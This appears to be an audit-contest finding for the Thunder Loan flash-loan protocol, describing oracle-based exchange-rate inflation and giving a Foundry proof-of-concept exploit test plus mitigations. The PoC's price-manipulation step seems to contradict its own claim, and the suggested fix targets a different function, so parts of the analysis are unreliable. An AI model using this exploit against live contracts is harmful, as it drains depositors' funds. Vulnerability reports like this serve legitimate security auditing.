## Thunder Loan
[https://codehawks.cyfrin.io/c/thunder-loan-clk83mi5b0004jp08axr82nq1/s/1]

100
EXP

Jan 26th, 2026 → Jan 27th, 2026

## Submission Details
Severity: **High**

## Exchange Rate Manipulation Through Flash Loan Oracle Dependency

firmanregar

## Root + Impact Description
ThunderLoan's `flashloan()` function calculates fees using a spot-price oracle and immediately updates the AssetToken's exchange rate with this fee value. An attacker can manipulate the oracle price during a flash loan transaction, causing the exchange rate to be permanently inflated. This inflated rate is then used in `redeem()` to withdraw more underlying tokens than deposited, resulting in protocol insolvency.

The vulnerability exists in the interaction between three components:
1. Fee Calculation - Uses spot price from TSwap oracle
2. Exchange Rate Update - Permanently increases based on calculated fee
3. Redemption - Trusts the exchange rate without solvency checks

```solidity
// ThunderLoan.sol - flashloan()
​
function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external {
// ...uint256 fee = getCalculatedFee(token, amount); 
// Uses oracle price
assetToken.updateExchangeRate(fee); 
// Permanent state change
// ...
}
​
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
uint256 valueOfBorrowedToken = (amount \* getPriceInWeth(address(token))) / s\_feePrecision;
fee = (valueOfBorrowedToken \* s\_flashLoanFee) / s\_feePrecision;
}
```

```solidity
// AssetToken.sol
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
uint256 newExchangeRate = s\_exchangeRate \* (totalSupply() + fee) / totalSupply();
if (newExchangeRate <= s\_exchangeRate) {
revert AssetToken\_\_ExhangeRateCanOnlyIncrease(s\_exchangeRate, newExchangeRate);
}
s\_exchangeRate = newExchangeRate; // Irreversible increase
emit ExchangeRateUpdated(s\_exchangeRate);\
}
```

## Risk
**Likelihood:**

An attacker can execute the following steps in a single transaction
1. Price Manipulation: Use flash-borrowed capital to manipulate the TSwap pool, inflating the token's price
2. Flash Loan: Call `ThunderLoan.flashloan(`), which:
* Calculates an artificially high fee based on the manipulated price
* Permanently increases the exchange rate using this inflated fee
3. Repayment: Repay the flash loan normally (the loan itself succeeds)
4. Price Normalization: Oracle price returns to normal after the manipulation unwinds
5. Exploitation: Redeem AssetTokens at the inflated exchange rate, receiving more underlying tokens than economically justified

**Impact:**
* Direct Loss: Attackers can extract excess underlying tokens from the AssetToken contract
* Protocol Insolvency: The AssetToken becomes undercollateralized
* Cascading Failure: Later depositors cannot fully redeem their positions
* Permanent State Corruption: No mechanism exists to normalize or reverse the exchange rate inflation

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
​
import "forge-std/Test.sol";
import "../src/protocol/ThunderLoan.sol";
import "../src/protocol/AssetToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
​
// Simple AMM pool for testing
contract SimpleTSwapPool {
    ERC20 public token;
    ERC20 public weth;
​
    constructor(ERC20 _token, ERC20 _weth) {
        token = _token;
        weth = _weth;
    }
​
    function seed(uint256 tokenAmt, uint256 wethAmt) external {
        token.transferFrom(msg.sender, address(this), tokenAmt);
        weth.transferFrom(msg.sender, address(this), wethAmt);
    }
​
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) {
        uint256 tokenBal = token.balanceOf(address(this));
        uint256 wethBal = weth.balanceOf(address(this));
        return (wethBal * 1e18) / tokenBal;
    }
​
    function swapTokenForWeth(uint256 tokenIn) external {
        uint256 tokenBal = token.balanceOf(address(this));
        uint256 wethBal = weth.balanceOf(address(this));
        uint256 wethOut = (tokenIn * wethBal) / (tokenBal + tokenIn);
​
        token.transferFrom(msg.sender, address(this), tokenIn);
        weth.transfer(msg.sender, wethOut);
    }
}
​
contract TestToken is ERC20 {
    constructor(string memory n) ERC20(n, n) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}
​
contract AttackerReceiver {
    ThunderLoan public loan;
    IERC20 public token;
​
    constructor(ThunderLoan _loan, IERC20 _token) {
        loan = _loan;
        token = _token;
    }
​
    function executeOperation(
        address,
        uint256 amount,
        uint256 fee,
        address,
        bytes calldata
    ) external returns (bool) {
        token.approve(address(loan), amount + fee);
        loan.repay(token, amount + fee);
        return true;
    }
}
​
contract ExchangeRateManipulationTest is Test {
    ThunderLoan loan;
    AssetToken asset;
    TestToken token;
    TestToken weth;
    SimpleTSwapPool pool;
    AttackerReceiver receiver;
​
    address attacker = address(0xBEEF);
    address lp = address(0xCAFE);
​
    function setUp() public {
        // Setup tokens and pool
        vm.startPrank(lp);
        token = new TestToken("TOKEN");
        weth = new TestToken("WETH");
        token.mint(lp, 1_000 ether);
        weth.mint(lp, 1_000 ether);
​
        pool = new SimpleTSwapPool(token, weth);
        token.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.seed(100 ether, 100 ether);
        vm.stopPrank();
​
        // Deploy ThunderLoan
        loan = new ThunderLoan();
        loan.initialize(address(this));
        
        // Allow token
        vm.prank(loan.owner());
        asset = loan.setAllowedToken(token, true);
​
        // Setup attacker
        receiver = new AttackerReceiver(loan, token);
        token.mint(attacker, 10 ether);
        
        vm.startPrank(attacker);
        token.approve(address(loan), type(uint256).max);
        loan.deposit(token, 1 ether);
        vm.stopPrank();
    }
​
    function test_ExchangeRateInflation() public {
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 exchangeRateBefore = asset.getExchangeRate();
​
        // Manipulate oracle price
        vm.startPrank(attacker);
        token.approve(address(pool), type(uint256).max);
        pool.swapTokenForWeth(20 ether);
​
        // Flash loan triggers exchange rate inflation
        loan.flashloan(address(receiver), token, 10 ether, "");
        
        uint256 exchangeRateAfter = asset.getExchangeRate();
        
        // Redeem at inflated rate
        loan.redeem(token, type(uint256).max);
        vm.stopPrank();
​
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
​
        // Verify exploitation
        assertGt(exchangeRateAfter, exchangeRateBefore, "Exchange rate not inflated");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "No value extracted");
        
        emit log_named_uint("Exchange rate increase", exchangeRateAfter - exchangeRateBefore);
        emit log_named_uint("Tokens extracted", attackerBalanceAfter - attackerBalanceBefore);
    }
}
```

The exchange rate increase is permanent and irreversible, but it's based on a temporary price manipulation. Once the oracle price returns to normal, the inflated exchange rate remains, creating a disconnect between the accounting rate and actual economic value.

## Recommended Mitigation
Consider implementing one or more of the following fixes:

1. Use Time-Weighted Average Price (TWAP) instead of spot price for fee calculations
2. Remove exchange rate dependency on oracle prices - calculate fees in a way that doesn't affect long-term accounting
3. Implement solvency checks in `redeem()` to ensure sufficient backing
4. Add exchange rate bounds to limit the maximum increase per update
5. Separate flash loan fees from exchange rate calculations entirely

Example fix for the deposit function (where a similar issue exists):
```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
AssetToken assetToken = s\_tokenToAssetToken\[token];
uint256 exchangeRate = assetToken.getExchangeRate();
uint256 mintAmount = (amount \* assetToken.EXCHANGE\_RATE\_PRECISION()) / exchangeRate;
emit Deposit(msg.sender, token, amount);
assetToken.mint(msg.sender, mintAmount);\
// Remove this line - don't update exchange rate based on fees during deposit
// uint256 calculatedFee = getCalculatedFee(token, amount);
// assetToken.updateExchangeRate(calculatedFee);
​
token.safeTransferFrom(msg.sender, address(assetToken), amount);\
}
```
